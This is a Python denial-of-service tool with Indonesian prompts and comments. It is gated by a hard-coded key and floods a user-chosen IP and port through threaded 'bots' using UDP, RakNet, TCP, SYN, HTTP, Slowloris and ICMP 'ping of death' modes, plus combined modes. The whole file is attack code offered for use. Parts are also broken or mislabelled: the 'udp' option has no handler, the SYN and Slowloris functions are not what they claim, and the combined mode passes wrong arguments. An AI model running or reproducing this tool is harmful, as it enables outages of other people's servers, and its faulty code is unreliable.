import socket
import threading
import random
import struct
import time
import os
import psutil

# Fungsi untuk RakNet Flood
def raknet_flood(ip, port, duration, bot_id):
    end_time = time.time() + duration
    packets_sent = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    print(f"[BOT-{bot_id}] Memulai serangan RakNet ke {ip}:{port} selama {duration} detik...")
    while time.time() < end_time:
        try:
            packet_id = random.randint(0x00, 0xFF)
            packet_data = struct.pack('>B', packet_id) + b"RakNet" + b"\x00" * random.randint(10, 50)
            sock.sendto(packet_data, (ip, port))
            packets_sent += 1
        except:
            pass
    print(f"[BOT-{bot_id}] Serangan selesai. Total paket terkirim: {packets_sent}")

# Fungsi untuk UDP Bypass
def udp_bypass(ip, port, duration, bot_id):
    end_time = time.time() + duration
    packets_sent = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    print(f"[BOT-{bot_id}] Memulai serangan UDP Bypass ke {ip}:{port} selama {duration} detik...")
    while time.time() < end_time:
        try:
            packet_data = b"".join(
                random.choice([b"ZAXXYONTOP", b"RakNet", b"\x01\x02\x03"]) for _ in range(random.randint(5, 15))
            )
            sock.sendto(packet_data, (ip, port))
            packets_sent += 1
        except:
            pass
    print(f"[BOT-{bot_id}] Serangan selesai. Total paket terkirim: {packets_sent}")

# Fungsi untuk TCP Flood
def tcp_flood(ip, port, duration, bot_id):
    end_time = time.time() + duration
    packets_sent = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    print(f"[BOT-{bot_id}] Memulai serangan TCP Flood ke {ip}:{port} selama {duration} detik...")
    while time.time() < end_time:
        try:
            sock.connect((ip, port))
            sock.send(b"GET / HTTP/1.1\r\n")
            packets_sent += 1
        except:
            pass
    print(f"[BOT-{bot_id}] Serangan selesai. Total paket terkirim: {packets_sent}")

# Fungsi untuk CPU Burn
def cpu_burn(duration, cpu_percent):
    end_time = time.time() + duration
    print(f"Membakar CPU dengan penggunaan {cpu_percent}% selama {duration} detik...")
    while time.time() < end_time:
        psutil.cpu_percent(interval=1)
    print("CPU Burn selesai.")

# Fungsi untuk Slowloris
def slowloris(ip, port, duration, bot_id):
    end_time = time.time() + duration
    packets_sent = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    print(f"[BOT-{bot_id}] Memulai serangan Slowloris ke {ip}:{port} selama {duration} detik...")
    while time.time() < end_time:
        try:
            sock.connect((ip, port))
            sock.send(b"GET / HTTP/1.1\r\n")
            packets_sent += 1
        except:
            pass
    print(f"[BOT-{bot_id}] Serangan selesai. Total paket terkirim: {packets_sent}")

# Fungsi untuk Ping of Death
def ping_of_death(ip, duration, bot_id):
    end_time = time.time() + duration
    packets_sent = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

    print(f"[BOT-{bot_id}] Memulai serangan Ping of Death ke {ip} selama {duration} detik...")
    while time.time() < end_time:
        try:
            packet_data = b"\x08\x00\x1d\xf1" + b"\x00" * 1000
            sock.sendto(packet_data, (ip, 0))
            packets_sent += 1
        except:
            pass
    print(f"[BOT-{bot_id}] Serangan selesai. Total paket terkirim: {packets_sent}")

# Fungsi untuk SYN Flood
def syn_flood(ip, port, duration, bot_id):
    end_time = time.time() + duration
    packets_sent = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    print(f"[BOT-{bot_id}] Memulai serangan SYN Flood ke {ip}:{port} selama {duration} detik...")
    while time.time() < end_time:
        try:
            sock.connect((ip, port))
            sock.send(b"SYN")
            packets_sent += 1
        except:
            pass
    print(f"[BOT-{bot_id}] Serangan selesai. Total paket terkirim: {packets_sent}")

# Fungsi untuk HTTP Flood
def http_flood(ip, port, duration, bot_id):
    end_time = time.time() + duration
    packets_sent = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    print(f"[BOT-{bot_id}] Memulai serangan HTTP Flood ke {ip}:{port} selama {duration} detik...")
    while time.time() < end_time:
        try:
            sock.connect((ip, port))
            sock.send(b"GET / HTTP/1.1\r\n")
            packets_sent += 1
        except:
            pass
    print(f"[BOT-{bot_id}] Serangan selesai. Total paket terkirim: {packets_sent}")

# Fungsi untuk Multi Attack (menggabungkan beberapa metode)
def multi_attack(ip, port, duration, bot_id):
    print(f"[BOT-{bot_id}] Menjalankan Multi Attack ke {ip}:{port} selama {duration} detik...")
    # Menjalankan beberapa metode secara bersamaan
    raknet_thread = threading.Thread(target=raknet_flood, args=(ip, port, duration, bot_id))
    udp_bypass_thread = threading.Thread(target=udp_bypass, args=(ip, port, duration, bot_id))
    cpu_burn_thread = threading.Thread(target=cpu_burn, args=(duration, 100))
    
    raknet_thread.start()
    udp_bypass_thread.start()
    cpu_burn_thread.start()
    
    raknet_thread.join()
    udp_bypass_thread.join()
    cpu_burn_thread.join()
    print(f"[BOT-{bot_id}] Multi Attack selesai.")

# Fungsi untuk Semua serangan bersamaan
def semua(ip, port, duration, bot_id):
    print(f"[BOT-{bot_id}] Menjalankan Semua Serangan Bersamaan ke {ip}:{port} selama {duration} detik...")
    threads = []
    methods = [raknet_flood, udp_bypass, tcp_flood, cpu_burn, slowloris, ping_of_death, syn_flood, http_flood]
    
    for method in methods:
        thread = threading.Thread(target=method, args=(ip, port, duration, bot_id))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print(f"[BOT-{bot_id}] Semua serangan selesai.")

# Main script
key = input("Masukkan key: ")
if key != "zaxxyontop":
    print("Key salah! Keluar...")
    exit()

ip_target = input("Masukkan IP target: ")
port_target = int(input("Masukkan Port target: "))
attack_type = input("Masukkan jenis serangan (udp/tcp/raknet/bypass/syn/http/slowloris/multi/semua): ").lower()
bot_count = int(input("Masukkan jumlah bot: "))
duration = int(input("Masukkan durasi serangan (detik): "))

if attack_type not in ["udp", "tcp", "raknet", "bypass", "syn", "http", "slowloris", "multi", "semua"]:
    print("Jenis serangan tidak valid! Keluar...")
    exit()

print(f"Attack telah dimulai! Menyerang {ip_target}:{port_target} dengan {bot_count} bot...")
bot_threads = []

for bot_id in range(1, bot_count + 1):
    if attack_type == "raknet":
        thread = threading.Thread(target=raknet_flood, args=(ip_target, port_target, duration, bot_id))
    elif attack_type == "bypass":
        thread = threading.Thread(target=udp_bypass, args=(ip_target, port_target, duration, bot_id))
    elif attack_type == "tcp":
        thread = threading.Thread(target=tcp_flood, args=(ip_target, port_target, duration, bot_id))
    elif attack_type == "syn":
        thread = threading.Thread(target=syn_flood, args=(ip_target, port_target, duration, bot_id))
    elif attack_type == "http":
        thread = threading.Thread(target=http_flood, args=(ip_target, port_target, duration, bot_id))
    elif attack_type == "slowloris":
        thread = threading.Thread(target=slowloris, args=(ip_target, port_target, duration, bot_id))
    elif attack_type == "multi":
        thread = threading.Thread(target=multi_attack, args=(ip_target, port_target, duration, bot_id))
    elif attack_type == "semua":
        thread = threading.Thread(target=semua, args=(ip_target, port_target, duration, bot_id))
    thread.start()
    bot_threads.append(thread)

# Menunggu semua thread selesai
for thread in bot_threads:
    thread.join()

print("Serangan selesai!")